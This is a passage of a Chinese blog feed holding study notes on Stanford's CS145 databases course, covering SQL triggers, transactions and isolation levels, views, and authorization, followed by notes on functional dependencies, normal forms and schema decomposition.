class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--当一个事件有多个触发器时，率先触发的是较晚定义的触发器</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> R1</span><br><span class="line">after <span class="keyword">insert</span> <span class="keyword">on</span> T1</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">update</span> T1 <span class="keyword">set</span> A <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> R2</span><br><span class="line">after <span class="keyword">insert</span> <span class="keyword">on</span> T1</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span></span><br><span class="line"><span class="keyword">when</span> <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> T1 <span class="keyword">where</span> A <span class="operator">=</span> <span class="number">2</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">update</span> T1 <span class="keyword">set</span> A <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--执行insert into T1 value(1);</span></span><br><span class="line"><span class="comment">--得到T1中属性A的值为2，说明R2先触发，R1晚触发</span></span><br></pre></td></tr></table></figure><hr><h1 id="三、事务-Transactions"><a href="#三、事务-Transactions" class="headerlink" title="三、事务(Transactions)"></a>三、事务(Transactions)</h1><h2 id="1-基本介绍-2"><a href="#1-基本介绍-2" class="headerlink" title="1. 基本介绍"></a>1. 基本介绍</h2><p>通俗来讲，<strong>事务</strong>就是把<strong>许多语句当作一个整体</strong>来处理。</p><p>语句一般分为三个操作：get(取出数据); modify(修改数据); put(放回数据);<br>然而，当多个语句交叉在一起时，可能会出现属性、元组以及关系表上的结果不一致。<br>因此，我们需要<strong>将语句隔离</strong>开来。</p><p>同时，在进行大批量的语句操作时，如果系统突然崩溃，只有一半的语句被执行，我们需要有一个机制将剩余的语句执行，或者是将已执行的语句撤销，而不是将全部的语句再执行一遍。因此，我们在业务上将一批语句看作一个整体，称作事务，每个事务<strong>要么完全成功，要么完全失败</strong></p><p>在SQL标准中，用”commit”语句来表示一个事务的结束，同时也是下一个事务的开始。启动”Autocommit”模式时，每一条语句就是一个事务</p><h2 id="2-ACID特性"><a href="#2-ACID特性" class="headerlink" title="2. ACID特性"></a>2. ACID特性</h2><p>事务具有四大特性，可以总结为:</p><ol><li><strong>原子性(Atomicity)</strong>：一个事务要么<strong>完全成功</strong>，要么<strong>完全失败</strong></li><li><strong>一致性(Consistency)</strong>：每个事务执行前后都<strong>一直满足预定的约束</strong></li><li><strong>隔离性(Isolation)</strong>：事务中的操作可以交错，但是事务之间应该是<strong>串行</strong>执行的</li><li><strong>持久性(Durability)</strong>：就算系统崩溃，事务做的操作能够<strong>保留在数据库</strong>中</li></ol><h2 id="3-隔离级别-Isolation-Level"><a href="#3-隔离级别-Isolation-Level" class="headerlink" title="3. 隔离级别(Isolation Level)"></a>3. 隔离级别(Isolation Level)</h2><p>隔离级别越高，并发性越低，有时我们愿意牺牲一定的一致性去换取并发性。</p><p>隔离级别是<strong>针对每个事务</strong>而言，我们可以给不同的事务设置不同的隔离级别。</p><p>隔离级别从低到高依次为：</p><ol><li><strong>读未提交</strong>(Read Uncommitted)：允许该事务读取其他事务中，未commit的数据。我们称这种现象为<strong>脏读</strong>(Dirty reads)</li><li><strong>读提交</strong>(Read Committed)：不允许脏读，但是允许多次读取同一组数据。尽管不会出现脏读，但是不同时间读到的同一组数据的值可能会被另一个事务<strong>更新或删除</strong>，导致两次读取的值不同，我们称这种现象为<strong>不可重复读</strong>(Nonrepeatable reads)</li><li><strong>可重复读</strong>(Repeatable Read)：要求被多次读取的同一组数据不能被修改。但是我们在不同时间对表做查询操作时，可能会有另一个事务对该表做<strong>插入</strong>操作，导致第二次查询出现了原来没有的元组，我们称之为幻影元组(Phantom Tuples)，称这种现象为<strong>幻读</strong>(Phantom read)</li><li><strong>串行化</strong>(Serializable)：每个事务之间按照一定顺序执行</li></ol><p>SQL标准的默认隔离级别是Serializable，许多系统默认的隔离级别是：<strong>Repeatable Read</strong></p><p>除了设置事务的隔离级别，我们也可以设置事务为<strong>只读</strong>(Read Only)，使其不能对数据库做任何修改</p><p>示例：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> Transaction Read <span class="keyword">Only</span>;</span><br><span class="line"><span class="keyword">Set</span> Transaction Isolation Level Repeatable Read;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">Avg</span>(GPA) <span class="keyword">From</span> student;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">Max</span>(GPA) <span class="keyword">From</span> student</span><br></pre></td></tr></table></figure></p><p>隔离级别对三个问题的解决程度如下：</p><div class="table-container"><table><thead><tr><th style="text-align:center">隔离级别</th><th style="text-align:center">脏读</th><th style="text-align:center">不可重复读</th><th style="text-align:center">幻读</th></tr></thead><tbody><tr><td style="text-align:center">读未提交</td><td style="text-align:center">$\times$</td><td style="text-align:center">$\times$</td><td style="text-align:center">$\times$</td></tr><tr><td style="text-align:center">读提交</td><td style="text-align:center">$\surd$</td><td style="text-align:center">$\times$</td><td style="text-align:center">$\times$</td></tr><tr><td style="text-align:center">可重复读</td><td style="text-align:center">$\surd$</td><td style="text-align:center">$\surd$</td><td style="text-align:center">$\times$</td></tr><tr><td style="text-align:center">串行化</td><td style="text-align:center">$\surd$</td><td style="text-align:center">$\surd$</td><td style="text-align:center">$\surd$</td></tr></tbody></table></div><hr><h1 id="四、视图-Views"><a href="#四、视图-Views" class="headerlink" title="四、视图(Views)"></a>四、视图(Views)</h1><h2 id="1-基本介绍-3"><a href="#1-基本介绍-3" class="headerlink" title="1. 基本介绍"></a>1. 基本介绍</h2><p>视图是建立在关系模型之上的进一步抽象，它封装和隐藏底层的数据，只暴露需要的数据给用户。目的是简化查询，限制数据访问，提高安全性和提高性能。</p><p>视图包括两种：</p><ol><li>默认为虚拟<strong>视图</strong>(Virtual Views)，简称视图。视图是一个虚拟表，不存储任何数据</li><li><strong>物化视图</strong>(Materialized Views)，它占用存储空间，利用增量维护(incremental maintenance)算法使基表与视图保持同步</li></ol><p>当频繁查询且每次查询需要耗费大量资源时，我们使用物化视图</p><p>SQL标准下的视图语法：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> [Materialized] <span class="keyword">View</span> vname(A1, A2, …, An) <span class="keyword">AS</span></span><br><span class="line"><span class="operator">&lt;</span>Query<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></p><p>SQLite示例：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--视图示例</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> CSAccept <span class="keyword">as</span></span><br><span class="line"><span class="keyword">select</span> sID, cName</span><br><span class="line"><span class="keyword">from</span> Apply </span><br><span class="line"><span class="keyword">where</span> major <span class="operator">=</span><span class="string">&#x27;CS&#x27;</span><span class="keyword">and</span> decision <span class="operator">=</span> <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--物化视图示例</span></span><br><span class="line"><span class="keyword">Create</span> Materialized <span class="keyword">View</span> CA<span class="operator">-</span>AppTy <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">Select</span> sID, cName, major </span><br><span class="line"><span class="keyword">From</span> Apply A </span><br><span class="line"><span class="keyword">where</span> cName <span class="keyword">In</span> (<span class="keyword">select</span> cName <span class="keyword">From</span> College <span class="keyword">where</span> state <span class="operator">=</span> <span class="string">&#x27;CA&#x27;</span>)</span><br></pre></td></tr></table></figure></p><p>存在物化视图时，数据库会自动重写一些复杂的查询，以提高查询效率，如下<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="keyword">Distinct</span> S.sID, S.GPA</span><br><span class="line"><span class="keyword">From</span> College C, Student S, Apply A</span><br><span class="line"><span class="keyword">Where</span> c.cName <span class="operator">=</span> A.cName <span class="keyword">And</span> S.sID <span class="operator">=</span> A.sID </span><br><span class="line">    <span class="keyword">And</span> S.GPA <span class="operator">&gt;</span> <span class="number">3.5</span> <span class="keyword">And</span> C.state <span class="operator">=</span> <span class="string">&#x27;CA&#x27;</span> <span class="keyword">And</span> A.major<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">--以上查询可以被重写为</span></span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">Distinct</span> S.sID, S.GPA</span><br><span class="line"><span class="keyword">From</span> Student S, CA<span class="operator">-</span>Apply A</span><br><span class="line"><span class="keyword">Where</span> S.sID <span class="operator">=</span> A.sID </span><br><span class="line">    <span class="keyword">And</span> S.GPA <span class="operator">&gt;</span> <span class="number">3.5</span> <span class="keyword">And</span> A.major <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br></pre></td></tr></table></figure></p><h2 id="2-视图的修改操作"><a href="#2-视图的修改操作" class="headerlink" title="2. 视图的修改操作"></a>2. 视图的修改操作</h2><h3 id="2-1-使用触发器"><a href="#2-1-使用触发器" class="headerlink" title="2.1 使用触发器"></a>2.1 使用触发器</h3><p>用<strong>INSTEAD OF</strong>接 对视图的修改操作，随后在指定动作中</p><p>示例：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> CSAcceptDelete</span><br><span class="line">instead <span class="keyword">of</span> <span class="keyword">delete</span> <span class="keyword">on</span> CSAccept</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">delete</span> <span class="keyword">from</span> Apply </span><br><span class="line">    <span class="keyword">where</span> sID <span class="operator">=</span> Old.sID <span class="keyword">and</span> cName <span class="operator">=</span> Old.cName </span><br><span class="line">        <span class="keyword">and</span> major<span class="operator">=</span><span class="string">&#x27;cs&#x27;</span> <span class="keyword">and</span> decision <span class="operator">=</span><span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure></p><p>使用触发器对视图修改，优点是能够处理所有的修改操作，只要我们对这些操作编写对应的触发器；缺点是我们无法保证这些修改就是有现实意义的。</p><h3 id="2-2-自动视图修改"><a href="#2-2-自动视图修改" class="headerlink" title="2.2 自动视图修改"></a>2.2 自动视图修改</h3><p>在SQL标准下，当视图满足以下条件时，可称为Updatable Views：</p><ol><li>只对一个表$T$查询，且不能使用DISTINCT</li><li>未被查询的其他值不能有非空约束，或者具有默认值</li><li>子查询中不能出现表$T$</li><li>不能出现分组查询(GROUP BY)和聚合查询</li></ol><p>Updatable Views保证了对视图做修改操作时不会出现歧义。</p><p>一般来说，我们<strong>对视图的修改</strong>会转化为对基表的修改，然后<strong>应该反映在视图</strong>中，而不是悄咪咪地在我们看不到的地方修改了基表的数据，简称，<strong>保证视图的一致性</strong>。</p><p>使用<strong>WITH CHECK OPTION</strong>可以让数据库自动为我们检查修改操作是否违背了一致性：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> CSEE <span class="keyword">as</span></span><br><span class="line"><span class="keyword">select</span> sID, cName, major</span><br><span class="line"><span class="keyword">from</span> Apply </span><br><span class="line"><span class="keyword">where</span> major <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span> <span class="keyword">or</span> major <span class="operator">=</span> <span class="string">&#x27;EE&#x27;</span> </span><br><span class="line"><span class="keyword">with</span> <span class="keyword">check</span> option;</span><br><span class="line"></span><br><span class="line"><span class="comment">--当没有with check option时，</span></span><br><span class="line"><span class="comment">--执行insert into CSEE values(123, &#x27;CMU&#x27;, &#x27;biology&#x27;)是不被阻止的，但是是不安全的</span></span><br></pre></td></tr></table></figure></p><p>使用自动的视图修改，优点是不需要用户的介入就能完成修改操作；缺点很明显，就是需要满足严格的限制条件</p><hr><h1 id="五、授权-Authorization"><a href="#五、授权-Authorization" class="headerlink" title="五、授权(Authorization)"></a>五、授权(Authorization)</h1><p>不同的用户应该对数据库有不同的操作权限，这些权限应当由权限更大的用户进行授权</p><p>SQL标准下的授权和撤销权限操作如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--privs表示授予的权限：select(attName, ...), update(attName, ...)</span></span><br><span class="line"><span class="comment">--users表示获得权限的用户：public表示所有用户</span></span><br><span class="line"><span class="keyword">Grant</span> privs <span class="keyword">On</span> R <span class="keyword">To</span> users</span><br><span class="line">[ <span class="keyword">with</span> <span class="keyword">Grant</span> option ]</span><br><span class="line"></span><br><span class="line"><span class="comment">--Cascade表示级联撤销下级的权限，但是下级经由其他上级得到的授权不会被撤销</span></span><br><span class="line"><span class="comment">--Restrict表示需要从下往上逐级撤销权限</span></span><br><span class="line"><span class="keyword">Revoke</span> privs <span class="keyword">on</span> R <span class="keyword">From</span> users</span><br><span class="line">[Cascade <span class="operator">/</span> Restrict]</span><br></pre></td></tr></table></figure></p><p>MySQL中的授权和撤销权限操作如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查询权限</span></span><br><span class="line"><span class="keyword">Show</span> Grants <span class="keyword">For</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--授予权限</span></span><br><span class="line"><span class="keyword">Grant</span> privs <span class="keyword">On</span> R <span class="keyword">To</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--撤销权限</span></span><br><span class="line"><span class="keyword">Revoke</span> privs <span class="keyword">on</span> R <span class="keyword">From</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> 关系型数据库 </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS145 Intro to databases 学习笔记3——关系型数据库设计、XML的查询、UML</title>
      <link href="/2024/01/29/CS145%20Intro%20to%20databases%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%E2%80%94%E2%80%94%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E3%80%81XML%E7%9A%84%E6%9F%A5%E8%AF%A2%E3%80%81UML/"/>
      <url>/2024/01/29/CS145%20Intro%20to%20databases%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%E2%80%94%E2%80%94%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1%E3%80%81XML%E7%9A%84%E6%9F%A5%E8%AF%A2%E3%80%81UML/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>晚上床上玩手机有点上头，导致一整天下午之前都没怎么精神刷课，于是调整了下学这套课程的排期，多排了一天嘻嘻，这下轻松多了。</p><p>本文是学习<strong>standford CS145 Introduction to Databases</strong>系列视频的第三篇笔记，主要包括第七章到第九章的内容：</p><ol><li>关系型数据库设计</li><li>XML的查询</li><li>统一建模语言(Unified Modeling Language， or UML)</li></ol><p>相关参考资料：</p><p>视频链接：<a href="https://www.youtube.com/playlist?list=PLroEs25KGvwzmvIxYHRhoGTz9w8LeXek0">Introduction to Databases - Jennifer Widom - Stanford</a></p><p>函数依赖、部分依赖、传递依赖等准备知识：<a href="https://blog.csdn.net/wyh7280/article/details/83350722">范式通俗理解：1NF、2NF、3NF和BNCF-CSDN博客</a></p><p>关系模式的分解原则：<a href="https://zhuanlan.zhihu.com/p/676907856">【数据库原理】（18）关系模式的分解 - 知乎 (zhihu.com)</a></p><p>三范式和BCNF的举例：<a href="https://blog.csdn.net/weixin_43954951/article/details/125494783">数据库三范式和BCNF范式的理解：生动举例-CSDN博客</a></p><p>3NF和BCNF的区别：<a href="https://techdifferences.com/difference-between-3nf-and-bcnf.html">Difference Between 3NF and BCNF (with Comparison Chart) - Tech Differences</a></p><p>组合和聚合：<a href="https://blog.csdn.net/m0_37989980/article/details/104470064/#5aggregtionspan_idj11span_169">UML一一 类图关系 (泛化、实现、依赖、关联、聚合、组合)_uml类图关系-CSDN博客</a></p><h1 id="一、关系型数据库设计"><a href="#一、关系型数据库设计" class="headerlink" title="一、关系型数据库设计"></a>一、关系型数据库设计</h1><h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h2><p>现有关系表$R$，关系表的所有属性的集合为$U$</p><p>设$X$、$Y$和$Z$皆为$R$上的一组属性，即$ X, Y, Z \subseteq U$</p><h3 id="1-1-函数依赖-Functional-Dependencies"><a href="#1-1-函数依赖-Functional-Dependencies" class="headerlink" title="1.1 函数依赖(Functional Dependencies)"></a>1.1 函数依赖(Functional Dependencies)</h3><h4 id="1-定义"><a href="#1-定义" class="headerlink" title="(1) 定义"></a>(1) 定义</h4><p>对 $ \forall t, u \in R$，如果 $t[X] = u[X]$，则有 $ t[Y] = u[Y]$，其中$ t[X]$代表取元组$t$所有$X$中的属性</p><p>则称，$Y$依赖于$X$，记为$X \rightarrow Y$</p><p>讲人话就是<strong>确定了$X$就确定了$Y$</strong>，称$Y$依赖于$X$</p><h4 id="2-Trivial-or-Nontrivial"><a href="#2-Trivial-or-Nontrivial" class="headerlink" title="(2) Trivial or Nontrivial"></a>(2) Trivial or Nontrivial</h4><p>trivial意为平常的、琐碎的、不重要的，所以trivial的Functional Dependency（以下简称FD）就是在讲废话，不能传递更多信息。</p><p>Trivial FD：当$ Y \subseteq X$，我们称$X \rightarrow Y$是 Trivial FD。因为确定了$X$肯定就确定了它的子集$Y$（讲废话</p><p>Nontivial FD：相对地，当$Y \nsubseteq X$，我们称 $ X \rightarrow Y$是 Nontrivial FD。</p><p>Complete nontrivial FD：当$X$和$Y$完全不重合时，即$ Y \cap X = \varnothing $，我们称$X \rightarrow Y$是 Complete nontrivial FD</p><h4 id="3-属性的闭包-Closure-of-Attributes"><a href="#3-属性的闭包-Closure-of-Attributes" class="headerlink" title="(3) 属性的闭包(Closure of Attributes)"></a>(3) 属性的闭包(Closure of Attributes)</h4><p>给定许多依赖$S$，和属性集$X$</p><p>设集合 $set  = X$</p><p>重复以下步骤直到$set$不发生改变:</p><p>如果有$A \rightarrow B$并且$A$在$set$当中，那么$ set  = set \cup B$</p><p>最后得到的$set$成为$X$在$S$上的闭包(Closure)，记作$X^+$</p><p>讲人话，闭包就是<strong>已知许多依赖$S$，确定了$X$后，能够确定的所有属性</strong></p><h3 id="1-2-部分依赖"><a href="#1-2-部分依赖" class="headerlink" title="1.2 部分依赖"></a>1.2 部分依赖</h3><p>当$ X \rightarrow Y$，取$X$的一子集$X’$，若$X’ \rightarrow Y$，则称$Y$部分依赖于$X$</p><p>讲人话就是<strong>确定了$X$中一部分值就能确定了$Y$</strong>，称$Y$部分依赖于$X$</p><h3 id="1-3-传递依赖"><a href="#1-3-传递依赖" class="headerlink" title="1.3 传递依赖"></a>1.3 传递依赖</h3><p>当$X \rightarrow Y$，并且$ Y \rightarrow Z$，并且$ Y \nrightarrow X$，则称$Z$传递依赖于$X$</p><p>讲人话就是<strong>确定了$X$能确定$Y$，确定了$Y$又能确定$Z$</strong>，并且<strong>确定了$Y$不能确定$X$</strong>（在范式比较中会提到为什么这么定义），就说$Z$传递依赖于$X$</p><h3 id="1-4-多值依赖-Multivalued-Dependencies-or-MVD"><a href="#1-4-多值依赖-Multivalued-Dependencies-or-MVD" class="headerlink" title="1.4 多值依赖(Multivalued Dependencies, or MVD)"></a>1.4 多值依赖(Multivalued Dependencies, or MVD)</h3><p>设$Z = U - X - Y$，即$Z$为属性集$U$中<strong>除了$X$和$Y$的剩余所有属性</strong></p><h4 id="1-定义-1"><a href="#1-定义-1" class="headerlink" title="(1) 定义"></a>(1) 定义</h4><p>对 $ \forall t_1, t_2 \in R$，如果 $t_1[X] = t_2[X]$，则$\exists v \in R$，使得$v[X] = t_1[X] = t_2[X]$，并且$v[Y] = t_1[Y]$，并且$ v[Z] = t_2[Z]$，则称$Y$多值依赖$X$</p><p><strong>讲人话就是，如果有$(x, y_1, z_1)$和$(x, y_1, z_2)$，则必有$(x, y_1, z_2)$和$(x, y_2, z_1)$（Y和Z是对称的），则称$Y$多值依赖$X$，记作$ Y \twoheadrightarrow X$</strong></p><p>也就是说，确定了$X$为$x$时，$Y$和$Z$会有很多种取值$y_1, y_2, …, y_m$和$z_1, z_2, …, z_n$，$Y$和$Z$的取值的所有组合都会出现</p><p>从定义中，我们可以看出，判断$Y$是否多值依赖$X$，还需要考虑全属性集$U$。也就是说，同样的属性集$Y$和$X$，在不同的全属性集$U$中，它们可能多值依赖的关系不同。</p><h4 id="2-Trivial-or-Nontrivial-1"><a href="#2-Trivial-or-Nontrivial-1" class="headerlink" title="(2) Trivial or Nontrivial"></a>(2) Trivial or Nontrivial</h4><ol><li>Trivial MVD：当$X \cup Y = U$或$Y \subseteq X$时，称$ X \twoheadrightarrow Y$为 Trivial MVD。</li></ol><blockquote><p>如果有$(x, y_1, z_1)$和$(x, y_2, z_2)$</p><p>当$X \cup Y = U$时，$Z = \varnothing$，得$z_1 = z_2 = NULL$。那么$(x, y_1, z_2) = (x, y_1, NULL)$，$(x, y_2, z_1) = (x, y_2, NULL)$已经在表中，自行满足了多值依赖的条件，</p><p>当$Y \subseteq X$时，有$X \rightarrow Y$，得$y_1 = y_2$。那么$(x, y_1, z_2) = (x, y_2, z_2)$，$(x, y_2, z_1) = (x, y_1, z_1)$已经在表中自行满足了多值依赖的条件</p><p>所以满足以上其中一种条件的多值依赖不能传递更多的信息，可称为Trivial MVD</p></blockquote><ol><li>Nontrivial MVD：当$Y$和$X$不满足以上条件，则称$X \twoheadrightarrow Y$为Nontrivial MVD</li></ol><h2 id="2-分解关系模式-Decompostion-of-Relational-Schema"><a href="#2-分解关系模式-Decompostion-of-Relational-Schema" class="headerlink" title="2. 分解关系模式(Decompostion of Relational Schema)"></a>2. 分解关系模式(Decompostion of Relational Schema)</h2><h3 id="2-1-分解的原则"><a href="#2-1-分解的原则" class="headerlink" title="2.1 分解的原则"></a>2.1 分解的原则</h3><p>将关系$R(U)$分解为$R_1(U_1)$和$R_2(U_2)$后，应当满足：</p><ol><li>$U_1 \cup U_2 = U$</li><li>$R_1 \bowtie R_2 = R$ （无损连接性）</li></ol><p>实际上满足第二条就会满足第一条（小声</p><p>“Good” Decomposition，也就是一个好的分解，应当满足<strong>无损连接性</strong>（能通过自然连接得到原始表）和<strong>依赖保留性</strong>（能在每个表中直接得到原来的所有依赖），详见前言中的参考资料</p><h3 id="2-2-BCNF分解"><a href="#2-2-BCNF分解" class="headerlink" title="2.2 BCNF分解"></a>2.2 BCNF分解</h3><h4 id="1-BCNF的定义"><a href="#1-BCNF的定义" class="headerlink" title="(1) BCNF的定义"></a>(1) BCNF的定义</h4><blockquote><p>注意：在实际情况中，可能不止有一组元素能够作为主键，比如$X^+ = U$，$Y^+ = U$，那么称$X$和$Y$都为<strong>超键</strong>，去掉超键中任意属性会使其不再为超键的，叫做<strong>候选键</strong>，我们可以在多个候选键中选一个叫<strong>主键</strong>。</p><p>假设$X$和$Y$都是候选键，$X \cup Y$也就是$X$和$Y$中的所有元素都称作主属性。而<strong>不是只有我们选定的主键中的元素才叫做主属性</strong></p></blockquote><p>对$R$中任一nontrivial FD$X \rightarrow Y$，$X$都是候选键的超集，那么就称$R$满足 鲍依斯-科得范式(Boyce Codd Normal Form, or BCNF)</p><h4 id="2-BCNF分解算法"><a href="#2-BCNF分解算法" class="headerlink" title="(2) BCNF分解算法"></a>(2) BCNF分解算法</h4><p>找到$R$中的候选键</p><p>重复以下步骤直到所有的关系都满足BCNF:</p><ol><li>关系$R’$的依赖$A \rightarrow B$不满足BCNF</li><li>将$R’$ 分解为 $R_1 = (A, B)$和$ R_2(A, rest)$，$rest$为$A$和$B$之外的剩余部分</li><li>找到$R_1$和$R_2$中的FD和候选键</li></ol><h3 id="2-3-4NF分解"><a href="#2-3-4NF分解" class="headerlink" title="2.3 4NF分解"></a>2.3 4NF分解</h3><h4 id="1-4NF的定义"><a href="#1-4NF的定义" class="headerlink" title="(1) 4NF的定义"></a>(1) 4NF的定义</h4><p>对$R$中任一nontrivial MVD$X \twoheadrightarrow Y$，$X$都是候选键的超集，那么就称$R$满足4NF</p><h4 id="2-4NF分解算法"><a href="#2-4NF分解算法" class="headerlink" title="(2) 4NF分解算法"></a>(2) 4NF分解算法</h4><p>找到$R$中的候选键</p><p>重复以下步骤直到所有的关系都满足4NF:</p><ol><li>关系$R’$的依赖$A \twoheadrightarrow B$不满足4NF</li><li>将$R’$ 分解为 $R_1 = (A, B)$和$ R_2(A, rest)$，$rest$为$A$和$B$之外的剩余部分</li><li>找到$R_1$和$R_2$中的MVD和候选键</li></ol><h2 id="3-范式之间的比较"><a href="#3-范式之间的比较" class="headerlink" title="3. 范式之间的比较"></a>3. 范式之间的比较</h2><h3 id="3-1-每一层范式解决的问题"><a href="#3-1-每一层范式解决的问题" class="headerlink" title="3.1 每一层范式解决的问题"></a>3.1 每一层范式解决的问题</h3><ul><li>1NF：每个元组的每个属性的值不能是集合，不可再分关系。1NF是$R$作为关系模型的最基本的条件</li><li>2NF：在1NF的基础上消除了<strong>非主属性对候选键的部分依赖</strong>，也就是非主属性不能只依赖于一部分主属性，应该完全依赖于所有主属性。</li><li>3NF：在2NF的基础上消除了<strong>非主属性对候选键的传递依赖</strong>。也就是非主属性不能依赖于其他非主属性，应该直接完全依赖于所有主属性。</li></ul><blockquote><p>前面我们讲到了传递依赖的定义：</p><p>当$X \rightarrow Y$，并且$ Y \rightarrow Z$，并且$ Y \nrightarrow X$，则称$Z$传递依赖于$X$</p><p>这里要求$ Y \nrightarrow X$是因为，如果$ Y \rightarrow X$，那么$Z$部分依赖于$Y$，而部分依赖已经在2NF中消除了。</p><p><strong>3NF究竟还遗留了哪些问题？</strong></p><p>我们现在只解决了主属性和非主属性之间的冗余，而BCNF希望解决多个候选键之间，也就是主属性之间的冗余。</p><p>当然，如果关系中只有一个候选键，那么3NF和BCNF其实没什么区别。要举出有多个后续键的例子比较困难，所以很难区分喵qwq</p></blockquote><ul><li>BCNF：在3NF的基础上消除了<strong>候选键之间的部分依赖和传递依赖</strong>。</li></ul><blockquote><p>至此，我们已经解决的冗余都是针对依赖关系而言，而依赖是一对一的。</p><p>倘若我们有$X \twoheadrightarrow Y$，剩余部分为$Z$，其中$X$对$Y$是1对m，$X$对$Z$是1对n，他们的组合就有$m \times n$个元组，而实际上用两个表$R_1$和$R_2$共$m + n$个元组就能表示这两个一对多的关系，而且$R_1 \bowtie R_2 = R$也符合分解的原则。</p></blockquote><ul><li>4NF：在BCNF的基础上<strong>消除了nontrivial MVD</strong>。</li></ul><h3 id="3-2-BCNF和4NF的不足"><a href="#3-2-BCNF和4NF的不足" class="headerlink" title="3.2 BCNF和4NF的不足"></a>3.2 BCNF和4NF的不足</h3><p>BCNF和4NF会对所有FD和MVD做检查和分解，当分解出来的表的属性过少时，我们需要对多个表做自然连接才能验证我们原来的FD和MVD，对查询不是很友好，所以应该尽量<strong>先选择能保留更多属性</strong>的分解。然后具体问题具体分析，权衡好查询负载(Query Workload)和过分解(Over Decomposition)之间的关系。</p><h1 id="二、XML的查询"><a href="#二、XML的查询" class="headerlink" title="二、XML的查询"></a>二、XML的查询</h1><h2 id="1-XPath"><a href="#1-XPath" class="headerlink" title="1. XPath"></a>1. 